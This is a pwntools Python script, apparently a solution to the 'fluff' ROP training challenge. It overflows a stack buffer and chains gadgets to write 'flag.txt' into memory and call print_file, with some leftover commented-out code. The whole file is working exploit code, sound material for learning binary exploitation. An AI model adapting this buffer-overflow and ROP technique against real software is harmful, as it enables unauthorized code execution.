from pwn import *
elf=exe=ELF("./fluff",checksec=False)
p=process(exe.path)
input()
offset=0x28
pop_rdi=0x00000000004006a3
pop_rbp=0x0000000000400588
mov=0x0000000000400606   #mov dword ptr [rbp + 0x48], edx; mov ebp, esp; call 0x500; mov eax, 0; pop rbp; ret;
pop_rdx=0x000000000040062a #pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
print_file=0x400510
rw_address=0x00000000601500
ret=0x0000000000400295
rbp_adress=0x00000000601500-0x48
flag1=0x0000000067616c66
flag2=0x000000007478742e
payload=b"A"*offset+p64(pop_rbp)+p64(rbp_adress+4)
payload+=p64(pop_rdx)+p64(flag2)+p64(0x00)
payload+=p64(ret)
payload+=p64(mov)+p64(0x00)

"""
payload+=p64(ret)
payload+=p64(pop_rdi)+p64(rw_address)
payload+=p64(print_file)"""
p.sendlineafter(b">",payload)
payload=b"A"*offset+p64(pop_rbp)+p64(rbp_adress)
payload+=p64(pop_rdx)+p64(flag1)+p64(0x00)
payload+=p64(ret)
payload+=p64(mov)+p64(0x00)
payload+=p64(ret)
payload+=p64(pop_rdi)+p64(rw_address)
payload+=p64(print_file)
p.sendlineafter(b">",payload)
p.interactive()